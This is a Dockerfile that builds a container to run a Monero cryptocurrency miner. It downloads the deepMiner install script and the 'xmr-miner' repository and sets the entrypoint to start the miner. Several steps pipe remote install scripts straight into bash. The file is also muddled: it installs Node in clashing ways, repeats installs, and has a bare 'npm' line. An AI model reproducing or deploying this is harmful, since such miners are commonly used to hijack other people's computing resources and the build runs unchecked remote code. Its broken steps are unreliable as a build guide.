FROM node:8

RUN             apt-get update -qq
RUN apt-get install --yes curl
RUN curl --silent --location https://deb.nodesource.com/setup_4.x | bash -
RUN apt-get install --yes nodejs
RUN apt-get install --yes build-essential
COPY . /src
RUN cd /src; npm install
RUN             apt-get install -qqy curl
RUN		curl https://raw.githubusercontent.com/deepwn/deepMiner/master/install.sh > install.sh
RUN		curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.1/install.sh | bash

RUN		apt install -qqy unzip
RUN   apt install -qqy wget
RUN		wget https://codeload.github.com/bradoyler/xmr-miner/zip/master
RUN   unzip master
RUN		apt install -qqy nodejs
RUN		cd xmr-miner-master && npm
WORKDIR /xmr-miner-master
ENTRYPOINT npm run dev
